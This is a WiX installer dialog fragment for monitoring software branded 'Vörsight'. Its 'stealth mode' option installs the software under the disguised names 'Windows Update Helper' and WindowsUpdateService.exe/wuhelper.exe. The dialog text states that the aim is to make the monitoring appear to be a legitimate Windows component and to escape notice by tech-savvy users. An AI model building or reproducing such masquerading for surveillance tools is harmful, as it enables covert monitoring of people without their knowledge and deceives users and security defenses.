<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs">
    <Fragment>
        <UI>
            <Dialog Id="StealthModeDialog" Width="370" Height="270" Title="Installation Options">
                <Control Id="Title" Type="Text" X="15" Y="6" Width="340" Height="15" Transparent="yes" NoPrefix="yes" Text="{\WixUI_Font_Title}Application Naming" />

                <Control Id="Description" Type="Text" X="25" Y="23" Width="320" Height="40" Transparent="yes" NoPrefix="yes" Text="Choose how the application appears on the system. Stealth mode makes the monitoring less obvious to tech-savvy users." />

                <Control Id="StealthModeCheckBox" Type="CheckBox" X="25" Y="70" Width="320" Height="17" Property="USE_STEALTH_MODE" CheckBoxValue="1" Text="Use stealth application naming (recommended for parental monitoring)" />

                <Control Id="StealthDetails" Type="Text" X="40" Y="92" Width="305" Height="90" Transparent="yes" NoPrefix="yes" Text="When enabled, the application will be installed as:&#13;&#10;&#13;&#10;• Directory: &quot;Windows Update Helper&quot;&#13;&#10;• Service: &quot;Windows Update Helper Service&quot;&#13;&#10;• Executables: WindowsUpdateService.exe, wuhelper.exe&#13;&#10;&#13;&#10;This makes the monitoring software appear as a legitimate Windows component while maintaining full functionality." />

                <Control Id="NormalModeLabel" Type="Text" X="40" Y="185" Width="305" Height="30" Transparent="yes" NoPrefix="yes" Text="When disabled, the application installs with its normal &quot;Vörsight&quot; branding, making it clear what the software is." />

                <Control Id="Back" Type="PushButton" X="180" Y="243" Width="56" Height="17" Text="&amp;Back">
                    <Publish Event="NewDialog" Value="GoogleDriveDialog" />
                </Control>

                <Control Id="Next" Type="PushButton" X="236" Y="243" Width="56" Height="17" Default="yes" Text="&amp;Next">
                    <Publish Event="NewDialog" Value="VerifyReadyDlg" />
                </Control>

                <Control Id="Cancel" Type="PushButton" X="304" Y="243" Width="56" Height="17" Cancel="yes" Text="Cancel">
                    <Publish Event="SpawnDialog" Value="CancelDlg" />
                </Control>
            </Dialog>
        </UI>
    </Fragment>
</Wix>
